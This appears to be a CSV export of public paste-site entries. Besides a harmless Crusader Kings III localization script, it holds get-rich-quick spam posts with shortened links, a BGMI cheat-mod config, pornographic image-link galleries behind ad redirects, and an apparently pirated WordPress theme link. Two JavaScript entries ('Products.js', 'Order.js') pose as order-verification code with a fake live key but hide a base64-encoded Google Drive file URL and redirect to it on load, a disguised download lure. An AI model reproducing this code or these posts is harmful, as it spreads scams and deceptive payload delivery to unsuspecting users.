id,title,username,language,date,content
JE6muK9Z,Make $1000 15-MINUTES (BEGINNER) FM,jasvan4,JavaScript,Friday 11th of April 2025 12:59:25 AM CDT," 
Pdf https://tinyurl.com/privguidee


8TLJR0DuXm
"
SLAKp89z,EARN $900 INSTANTLY 2025⭐ G8,jasvan4,JavaScript,Friday 11th of April 2025 12:45:59 AM CDT," 
Pdf https://tinyurl.com/privguidee


niJnXzFyUa
"
k0RLVcGA,Make $1000 15-MINUTES  (BEGINNER) HV,jasvan4,JavaScript,Friday 11th of April 2025 12:32:33 AM CDT," 
Pdf https://tinyurl.com/privguidee


8IEyQKjwm9
"
qE8VdUe1,bgmi.json,Jagdeep403,JSON,Friday 11th of April 2025 12:22:48 AM CDT,"{
  ""sections"": [
    {
      ""items"": [
        {
          ""description"": ""Nusa"",
          ""downloadLink"": ""https://example.com/downloads/ultra_graphics.pak"",
          ""filename"": ""NG_NuSA.zip"",
          ""id"": ""ng_nusa"",
          ""isAvailable"": true,
          ""needPakCopy"": true,
          ""needPufferCopy"": true,
          ""needSavCopy"": false,
          ""pakPath"": ""/storage/emulated/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/GameFeature/"",
          ""pufferPath"": ""/storage/emulated/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/puffer_temp/"",
          ""savPath"": """",
          ""title"": ""No Grass""
        },
        {
          ""description"": ""f"",
          ""downloadLink"": ""f"",
          ""filename"": ""f"",
          ""id"": ""2v92q0487"",
          ""isAvailable"": false,
          ""needPakCopy"": false,
          ""needPufferCopy"": true,
          ""needSavCopy"": false,
          ""pakPath"": """",
          ""pufferPath"": ""f"",
          ""savPath"": """",
          ""title"": ""f""
        }
      ],
      ""title"": ""No Grass""
    },
    {
      ""title"": ""dddd"",
      ""items"": []
    }
  ]
}"
mY36hGLr,EARN $900 INSTANTLY 2025 2U,jasvan4,JavaScript,Friday 11th of April 2025 12:19:08 AM CDT," 
Pdf https://tinyurl.com/privguidee


WipBuuYc6F
"
MJhmLL2M,CK3 fake translation 2,anon_user_007,PowerShell,Friday 11th of April 2025 12:17:54 AM CDT,"# Function to determine the file encoding by BOM
function Get-FileEncoding {
    param (
        [string]$Path
    )
    $fs = [System.IO.File]::OpenRead($Path)
    $bom = New-Object byte[] 4
    $fs.Read($bom, 0, 4) | Out-Null
    $fs.Close()

    if ($bom[0] -eq 0xEF -and $bom[1] -eq 0xBB -and $bom[2] -eq 0xBF) {
        return [System.Text.Encoding]::UTF8
    }
    elseif ($bom[0] -eq 0xFF -and $bom[1] -eq 0xFE) {
        return [System.Text.Encoding]::Unicode
    }
    elseif ($bom[0] -eq 0xFE -and $bom[1] -eq 0xFF) {
        return [System.Text.Encoding]::BigEndianUnicode
    }
    else {
        # If BOM is not found, return UTF8 by default
        return [System.Text.Encoding]::UTF8
    }
}

# Function for recursive renaming of files and folders (replace $srcLang with $dstLang)
function Rename-LocalizationItems ($path, $pattern, $replacement) {
    # First, rename files in the current directory
    Get-ChildItem -Path $path -File | ForEach-Object {
        if ($_.Name -match $pattern) {
            $newName = $_.Name -replace $pattern, $replacement
            Rename-Item -Path $_.FullName -NewName $newName -Force
            Write-Host ""Renamed file: $(Join-Path $_.DirectoryName $newName)""
        }
    }
    # Then, process subdirectories recursively
    Get-ChildItem -Path $path -Directory | ForEach-Object {
        Rename-LocalizationItems -path $_.FullName -pattern $pattern -replacement $replacement
        if ($_.Name -match $pattern) {
            $newName = $_.Name -replace $pattern, $replacement
            $parent = Split-Path $_.FullName -Parent
            Rename-Item -Path $_.FullName -NewName $newName -Force
            Write-Host ""Renamed folder: $(Join-Path $parent $newName)""
        }
    }
}

# Define source and target localization languages for checking
$srcLang = ""english""
$dstLang = ""russian""

# Paths for folders and files
$modsFolder   = ""D:\Games\SteamLibrary\steamapps\workshop\content\1158310""
$launcherDb   = ""C:\Users\$env:USERNAME\Documents\Paradox Interactive\Crusader Kings III\launcher-v2.sqlite""
$sqlite3Path  = ""D:\mods\Cursader Kings 3\sqlite-tools-win-x64-3490100\sqlite3.exe""
$destRoot     = ""C:\Users\$env:USERNAME\Documents\Paradox Interactive\Crusader Kings III\mod""

# Check if required files exist
if (!(Test-Path $sqlite3Path)) {
    Write-Host ""ERROR: sqlite3.exe not found at: $sqlite3Path"" -ForegroundColor Red
    exit
}
if (!(Test-Path $launcherDb)) {
    Write-Host ""ERROR: launcher-v2.sqlite not found at: $launcherDb"" -ForegroundColor Red
    exit
}

# Create a backup of the database
$timestamp  = Get-Date -Format ""yyyyMMddHHmmss""
$backupPath = ""$launcherDb.$timestamp""
Copy-Item -Path $launcherDb -Destination $backupPath -Force
Write-Host ""Database backup created: $backupPath""

# Get data from the database via sqlite3 (CSV output)
$query = ""SELECT ps.name AS playsetName, psm.position, m.displayName, m.steamId 
          FROM playsets ps 
          JOIN playsets_mods psm ON ps.id = psm.playsetId 
          JOIN mods m ON psm.modId = m.id 
          WHERE ps.isActive = 1 AND psm.enabled = 1 
          ORDER BY psm.position;""
$csvOutput = & $sqlite3Path $launcherDb "".headers on"" "".mode csv"" $query
$modData   = $csvOutput | ConvertFrom-Csv

Write-Host ""Data retrieved from database (only active mods):"" -ForegroundColor Cyan
$modData | Format-Table -AutoSize

# For each mod, identify the localization folder
foreach ($mod in $modData) {
    $modFolder = Join-Path $modsFolder $mod.steamId
    if (Test-Path $modFolder) {
        # Add mod folder path and its file list to the object
        $mod | Add-Member -MemberType NoteProperty -Name ModFolder -Value $modFolder -Force
        $locRoot = Join-Path $modFolder ""localization""
        if (Test-Path $locRoot) {
            $mod | Add-Member -MemberType NoteProperty -Name LocalizationRoot -Value $locRoot -Force
            # Get all files under the localization folder recursively
            $files = Get-ChildItem -Path $locRoot -Recurse -File
            $mod | Add-Member -MemberType NoteProperty -Name LocalizationFiles -Value $files -Force
        }
    }
    else {
        Write-Host ""Mod folder not found: $modFolder"" -ForegroundColor Yellow
    }
}

# Gather missing localization files
# For each mod, under the localization folder, check: for every file whose name contains $srcLang,
# determine the expected file path with $srcLang replaced by $dstLang. If such a file does not exist, mark it as missing.
$modsMissingLocalization = @()

foreach ($mod in $modData) {
    if ($mod.LocalizationRoot -and $mod.LocalizationFiles) {
        $locRoot = $mod.LocalizationRoot
        $missingFiles = @()
        # Select files whose names contain ""english""
        $englishFiles = $mod.LocalizationFiles | Where-Object { $_.Name -like ""*$srcLang*"" }
        foreach ($file in $englishFiles) {
            # Get relative path with respect to the localization folder
            $relativePath = $file.FullName.Substring($locRoot.Length + 1)
            # Compute the expected relative path replacing ""english"" with ""russian""
            $expectedRelativePath = $relativePath -replace $srcLang, $dstLang
            $expectedFullPath = Join-Path $locRoot $expectedRelativePath
            if (-not (Test-Path $expectedFullPath)) {
                $missingFiles += [PSCustomObject]@{
                    RelativePath = $relativePath
                    SourceFile   = $file.FullName
                    ExpectedPath = $expectedFullPath
                }
            }
        }
        if ($missingFiles.Count -gt 0) {
            $modsMissingLocalization += [PSCustomObject]@{
                ModDisplayName   = $mod.displayName
                SteamId          = $mod.steamId
                LocalizationRoot = $locRoot
                MissingFiles     = $missingFiles
            }
        }
    }
}

# Display the list of mods with missing (or incomplete) localization ($dstLang)
Write-Host ""Mods with missing (or incomplete) localization ($dstLang):"" -ForegroundColor Cyan
if ($modsMissingLocalization.Count -gt 0) {
    $modsMissingLocalization | Format-Table ModDisplayName, SteamId, @{Name=""Missing Files""; Expression={ $_.MissingFiles.Count } } -AutoSize
} else {
    Write-Host ""No mods with missing localization for language '$dstLang' found.""
}

# Process each mod: remove old mod folders and .mod files, then create new ones and copy missing files
foreach ($mod in $modsMissingLocalization) {
    $steamId = $mod.SteamId
    $destModFolder = Join-Path $destRoot $steamId

    # If the mod folder already exists, remove it along with its contents
    if (Test-Path $destModFolder) {
        Remove-Item -Path $destModFolder -Recurse -Force
        Write-Host ""Existing mod folder removed: $destModFolder""
    }
    # If a .mod file exists, remove it
    $modFilePath = Join-Path $destRoot (""$steamId.mod"")
    if (Test-Path $modFilePath) {
        Remove-Item -Path $modFilePath -Force
        Write-Host ""Existing mod file removed: $modFilePath""
    }
    # Create a new folder for the mod
    New-Item -ItemType Directory -Path $destModFolder -Force | Out-Null

    # For each missing file, copy the original file while preserving the relative structure to the localization folder
    foreach ($fileInfo in $mod.MissingFiles) {
        # Build the destination path: in the new mod folder create a 'localization' folder and append the file's relative path
        $destLocalizationBase = Join-Path $destModFolder ""localization""
        $destFilePath = Join-Path $destLocalizationBase $fileInfo.RelativePath
        $destDir = Split-Path $destFilePath -Parent
        if (!(Test-Path $destDir)) {
            New-Item -ItemType Directory -Path $destDir -Force | Out-Null
        }
        Copy-Item -Path $fileInfo.SourceFile -Destination $destFilePath -Force
        Write-Host ""File copied: $destFilePath""

        # Replace file content: change ""l_english:"" to ""l_russian:"" while preserving the original encoding
        $origEncoding = Get-FileEncoding -Path $destFilePath
        $content = Get-Content $destFilePath -Raw
        $updatedContent = $content -replace ""l_${srcLang}:"", ""l_${dstLang}:""
        [System.IO.File]::WriteAllText($destFilePath, $updatedContent, $origEncoding)
        Write-Host ""Processed file (content replaced): $destFilePath""
    }

    # Rename files and folders in the copied localization folder:
    # Replace ""english"" with ""russian"" in file and folder names
    $destLocalizationRoot = Join-Path $destModFolder ""localization""
    Rename-LocalizationItems -path $destLocalizationRoot -pattern $srcLang -replacement $dstLang

    # Create descriptor.mod file inside the mod folder
    $descriptorContent = @""
version=""1.*""
tags={
    ""Translation""
}
name=""$($mod.ModDisplayName) [fake $dstLang]""
supported_version=""1.*""
""@
    $descriptorPath = Join-Path $destModFolder ""descriptor.mod""
    [System.IO.File]::WriteAllText($descriptorPath, $descriptorContent, [System.Text.Encoding]::UTF8)
    Write-Host ""Created descriptor.mod for mod $($mod.ModDisplayName) (SteamId: $steamId)""

    # Create the .mod file in the root of $destRoot
    $destModPath = (Join-Path $destRoot $steamId) -replace ""\\"", ""/""
    $modFileContent = @""
version=""1.*""
tags={
    ""Translation""
}
name=""$($mod.ModDisplayName) [fake $dstLang]""
supported_version=""1.*""
path=""$destModPath""
""@
    $modFilePath = Join-Path $destRoot (""$steamId.mod"")
    [System.IO.File]::WriteAllText($modFilePath, $modFileContent, [System.Text.Encoding]::UTF8)
    Write-Host ""Created file $steamId.mod for mod $($mod.ModDisplayName) (SteamId: $steamId)""
}"
kn57HJEm,Mens only (Apr 11 2025),MarcSpencer,HTML,Friday 11th of April 2025 12:02:22 AM CDT,"Daniel Evans and Vincent Grey
<a href=""https://fappic.com/e9o5gv7jfise/next-door-studios-daniel-evans-and-vincent-grey-001.jpg""><img src=""https://img103.fappic.com/i/03914/e9o5gv7jfise_t.jpg""></a><a href=""https://fappic.com/nmaas61m3myd/next-door-studios-daniel-evans-and-vincent-grey-002.jpg""><img src=""https://img103.fappic.com/i/03914/nmaas61m3myd_t.jpg""></a><a href=""https://fappic.com/7k5ub5cb734n/next-door-studios-daniel-evans-and-vincent-grey-003.jpg""><img src=""https://img103.fappic.com/i/03914/7k5ub5cb734n_t.jpg""></a><a href=""https://fappic.com/z8dgd7sx3so5/next-door-studios-daniel-evans-and-vincent-grey-004.jpg""><img src=""https://img103.fappic.com/i/03914/z8dgd7sx3so5_t.jpg""></a><a href=""https://fappic.com/5owcdet82e1d/next-door-studios-daniel-evans-and-vincent-grey-005.jpg""><img src=""https://img103.fappic.com/i/03914/5owcdet82e1d_t.jpg""></a><a href=""https://fappic.com/xy1xs2pc6jtn/next-door-studios-daniel-evans-and-vincent-grey-006.jpg""><img src=""https://img103.fappic.com/i/03914/xy1xs2pc6jtn_t.jpg""></a><a href=""https://fappic.com/vmp2qcp5tl8w/next-door-studios-daniel-evans-and-vincent-grey-007.jpg""><img src=""https://img103.fappic.com/i/03914/vmp2qcp5tl8w_t.jpg""></a><a href=""https://fappic.com/0hzkbe7sugqu/next-door-studios-daniel-evans-and-vincent-grey-008.jpg""><img src=""https://img103.fappic.com/i/03914/0hzkbe7sugqu_t.jpg""></a><a href=""https://fappic.com/lp9j3lf05j3g/next-door-studios-daniel-evans-and-vincent-grey-009.jpg""><img src=""https://img103.fappic.com/i/03914/lp9j3lf05j3g_t.jpg""></a><a href=""https://fappic.com/nbauohr4gvpo/next-door-studios-daniel-evans-and-vincent-grey-010.jpg""><img src=""https://img103.fappic.com/i/03914/nbauohr4gvpo_t.jpg""></a><a href=""https://fappic.com/dpsclnlhfu8m/next-door-studios-daniel-evans-and-vincent-grey-011.jpg""><img src=""https://img103.fappic.com/i/03914/dpsclnlhfu8m_t.jpg""></a><a href=""https://fappic.com/yu2zn0x1x1ot/next-door-studios-daniel-evans-and-vincent-grey-012.jpg""><img src=""https://img103.fappic.com/i/03914/yu2zn0x1x1ot_t.jpg""></a><a href=""https://fappic.com/u7pic5ppviag/next-door-studios-daniel-evans-and-vincent-grey-013.jpg""><img src=""https://img103.fappic.com/i/03914/u7pic5ppviag_t.jpg""></a><a href=""https://fappic.com/67mcyrzzp4u6/next-door-studios-daniel-evans-and-vincent-grey-014.jpg""><img src=""https://img103.fappic.com/i/03914/67mcyrzzp4u6_t.jpg""></a><a href=""https://fappic.com/dm0yuun2ug0n/next-door-studios-daniel-evans-and-vincent-grey-015.jpg""><img src=""https://img103.fappic.com/i/03914/dm0yuun2ug0n_t.jpg""></a>

Evan pounds Rocky 
<a href=""https://fappic.com/csbd4nb8ph0i/corbin-fisher-evan-pounds-rocky-001.jpg""><img src=""https://img103.fappic.com/i/03914/csbd4nb8ph0i_t.jpg""></a><a href=""https://fappic.com/nvi6mo18h2a4/corbin-fisher-evan-pounds-rocky-002.jpg""><img src=""https://img103.fappic.com/i/03914/nvi6mo18h2a4_t.jpg""></a><a href=""https://fappic.com/3cahpe5qvp6v/corbin-fisher-evan-pounds-rocky-003.jpg""><img src=""https://img103.fappic.com/i/03914/3cahpe5qvp6v_t.jpg""></a><a href=""https://fappic.com/z8cvpgcs50z0/corbin-fisher-evan-pounds-rocky-004.jpg""><img src=""https://img103.fappic.com/i/03914/z8cvpgcs50z0_t.jpg""></a><a href=""https://fappic.com/h0ni7gdyk5u1/corbin-fisher-evan-pounds-rocky-005.jpg""><img src=""https://img103.fappic.com/i/03914/h0ni7gdyk5u1_t.jpg""></a><a href=""https://fappic.com/8bee6wrzeh3s/corbin-fisher-evan-pounds-rocky-006.jpg""><img src=""https://img103.fappic.com/i/03914/8bee6wrzeh3s_t.jpg""></a><a href=""https://fappic.com/3vrtfwh0sgcl/corbin-fisher-evan-pounds-rocky-007.jpg""><img src=""https://img103.fappic.com/i/03915/3vrtfwh0sgcl_t.jpg""></a><a href=""https://fappic.com/lftwfssfh9xr/corbin-fisher-evan-pounds-rocky-008.jpg""><img src=""https://img103.fappic.com/i/03915/lftwfssfh9xr_t.jpg""></a><a href=""https://fappic.com/bu8w7w9x3h5x/corbin-fisher-evan-pounds-rocky-009.jpg""><img src=""https://img103.fappic.com/i/03915/bu8w7w9x3h5x_t.jpg""></a><a href=""https://fappic.com/bdzbouu8haku/corbin-fisher-evan-pounds-rocky-010.jpg""><img src=""https://img103.fappic.com/i/03915/bdzbouu8haku_t.jpg""></a><a href=""https://fappic.com/l7xx87tl1g0q/corbin-fisher-evan-pounds-rocky-011.jpg""><img src=""https://img103.fappic.com/i/03915/l7xx87tl1g0q_t.jpg""></a><a href=""https://fappic.com/gi00q4e6t90j/corbin-fisher-evan-pounds-rocky-012.jpg""><img src=""https://img103.fappic.com/i/03915/gi00q4e6t90j_t.jpg""></a><a href=""https://fappic.com/ii83vmtlyxbz/corbin-fisher-evan-pounds-rocky-013.jpg""><img src=""https://img103.fappic.com/i/03915/ii83vmtlyxbz_t.jpg""></a><a href=""https://fappic.com/goamdtnyb6px/corbin-fisher-evan-pounds-rocky-014.jpg""><img src=""https://img103.fappic.com/i/03915/goamdtnyb6px_t.jpg""></a><a href=""https://fappic.com/pkkmtg79gc3l/corbin-fisher-evan-pounds-rocky-015.jpg""><img src=""https://img103.fappic.com/i/03915/pkkmtg79gc3l_t.jpg""></a><a href=""https://fappic.com/cjpz6f5bbr8w/corbin-fisher-evan-pounds-rocky-016.jpg""><img src=""https://img103.fappic.com/i/03915/cjpz6f5bbr8w_t.jpg""></a><a href=""https://fappic.com/gpadgqv473pb/corbin-fisher-evan-pounds-rocky-017.jpg""><img src=""https://img103.fappic.com/i/03915/gpadgqv473pb_t.jpg""></a><a href=""https://fappic.com/2pfryq6rbq9r/corbin-fisher-evan-pounds-rocky-018.jpg""><img src=""https://img103.fappic.com/i/03915/2pfryq6rbq9r_t.jpg""></a>

Alex Kof and Jace Starr 
<a href=""https://u-z7sqhgb7t7.urlcash.net""><img src=""https://img103.fappic.com/i/03914/dbu3sd11wov7_t.jpg""></a><a href=""https://u-57sqhgcls7.urlcash.net""><img src=""https://img103.fappic.com/i/03914/twhmanmoeiwu_t.jpg""></a><a href=""https://u-i7sqhgducj.urlcash.net""><img src=""https://img103.fappic.com/i/03914/vbk5i1ubsfc0_t.jpg""></a><a href=""https://u-67sqhgenei.urlcash.net""><img src=""https://img103.fappic.com/i/03914/x9clkjp5omw5_t.jpg""></a><a href=""https://u-v7sqhgftgv.urlcash.net""><img src=""https://img103.fappic.com/i/03914/og96zwolfq2o_t.jpg""></a><a href=""https://u-p7sqhggb5h.urlcash.net""><img src=""https://img103.fappic.com/i/03914/ldj7c1gqs3f1_t.jpg""></a><a href=""https://u-n7sqhghcw7.urlcash.net""><img src=""https://img103.fappic.com/i/03914/bmx2jxn9npkz_t.jpg""></a><a href=""https://u-77sqhgimdl.urlcash.net""><img src=""https://img103.fappic.com/i/03914/53ddj1el8vhf_t.jpg""></a><a href=""https://u-m7sqhg0tuk.urlcash.net""><img src=""https://img103.fappic.com/i/03914/gpdemj8ddgi8_t.jpg""></a><a href=""https://u-07sqhg1b2k.urlcash.net""><img src=""https://img103.fappic.com/i/03914/uandb3xfn0kb_t.jpg""></a><a href=""https://u-x7sqhg2j10.urlcash.net""><img src=""https://img103.fappic.com/i/03914/o8j6ujaqrwo4_t.jpg""></a><a href=""https://u-m7sqhg3v15.urlcash.net""><img src=""https://img103.fappic.com/i/03914/d7nl75n2qu68_t.jpg""></a><a href=""https://u-m7sqhg4020.urlcash.net""><img src=""https://img103.fappic.com/i/03914/k4fw83hz5ztz_t.jpg""></a><a href=""https://u-c7sqhg5tyl.urlcash.net""><img src=""https://img103.fappic.com/i/03914/jote3eo98w0n_t.jpg""></a><a href=""https://u-v7sqhg6zjk.urlcash.net""><img src=""https://img103.fappic.com/i/03914/pysrvt09l68w_t.jpg""></a><a href=""https://u-m7sqhg76vm.urlcash.net""><img src=""https://img103.fappic.com/i/03914/tjtmzhe8godu_t.jpg""></a><a href=""https://u-l7sqhg871c.urlcash.net""><img src=""https://img103.fappic.com/i/03914/bfftk5ywskku_t.jpg""></a><a href=""https://u-47sqhg9hnx.urlcash.net""><img src=""https://img103.fappic.com/i/03914/wlk6ko09ibwp_t.jpg""></a><a href=""https://u-a7sqhgjbee.urlcash.net""><img src=""https://img103.fappic.com/i/03914/6ek59czblkb6_t.jpg""></a>

Arno Antino and Seth Cain
<a href=""https://u-v7sqhglghg.urlcash.net""><img src=""https://img103.fappic.com/i/03914/mehpp2mo89v8_t.jpg""></a><a href=""https://u-z7sqhgmhja.urlcash.net""><img src=""https://img103.fappic.com/i/03914/puzvfg9i55ie_t.jpg""></a><a href=""https://u-47sqhgnsyx.urlcash.net""><img src=""https://img103.fappic.com/i/03914/9vdjsk88lr78_t.jpg""></a><a href=""https://u-b7sqhgoiho.urlcash.net""><img src=""https://img103.fappic.com/i/03914/fo2n922vh7cb_t.jpg""></a><a href=""https://u-77sqhgp73b.urlcash.net""><img src=""https://img103.fappic.com/i/03914/8vn4pv558zuu_t.jpg""></a><a href=""https://u-b7sqhgqx7d.urlcash.net""><img src=""https://img103.fappic.com/i/03914/aknohium8uhi_t.jpg""></a><a href=""https://u-i7sqhgrql0.urlcash.net""><img src=""https://img103.fappic.com/i/03914/6n66p6t6utmh_t.jpg""></a><a href=""https://u-37sqhgsbjd.urlcash.net""><img src=""https://img103.fappic.com/i/03914/1gr78zc6elsy_t.jpg""></a><a href=""https://u-u7sqhgtd5a.urlcash.net""><img src=""https://img103.fappic.com/i/03914/w247n7tclm2s_t.jpg""></a><a href=""https://u-z7sqhgupr5.urlcash.net""><img src=""https://img103.fappic.com/i/03914/w5zrgmagcsyn_t.jpg""></a><a href=""https://u-57sqhgv3kg.urlcash.net""><img src=""https://img103.fappic.com/i/03914/le0o7bfiyraa_t.jpg""></a><a href=""https://u-b7sqhgwfv6.urlcash.net""><img src=""https://img103.fappic.com/i/03914/yekrtu7hu84w_t.jpg""></a><a href=""https://u-z7sqhgxiir.urlcash.net""><img src=""https://img103.fappic.com/i/03914/pm2obxgj12lx_t.jpg""></a><a href=""https://u-m7sqhhahvl.urlcash.net""><img src=""https://img103.fappic.com/i/03914/v5gsrzsqjqyd_t.jpg""></a><a href=""https://u-s7sqhhb27b.urlcash.net""><img src=""https://img103.fappic.com/i/03914/dxxg3ex7geb4_t.jpg""></a><a href=""https://u-b7sqhhcges.urlcash.net""><img src=""https://img103.fappic.com/i/03914/7utqdbl7jb9j_t.jpg""></a><a href=""https://u-37sqhhdtrq.urlcash.net""><img src=""https://img103.fappic.com/i/03914/kv9rzzadq8vu_t.jpg""></a>
"
j63EUS3r,Wordpress Multi Purpose,andhiirawan,PHP,Thursday 10th of April 2025 11:26:20 PM CDT,"https://weadown.com/res/uomo-wordpress-theme/
https://demoapus-wp.com/landing-page/uomo/"
JkvhEQYK,Products.js,WassupDog45,JavaScript,Thursday 10th of April 2025 11:26:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/80151/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NgPQGA0A,Order.js,WassupDog45,JavaScript,Thursday 10th of April 2025 11:10:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79552/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
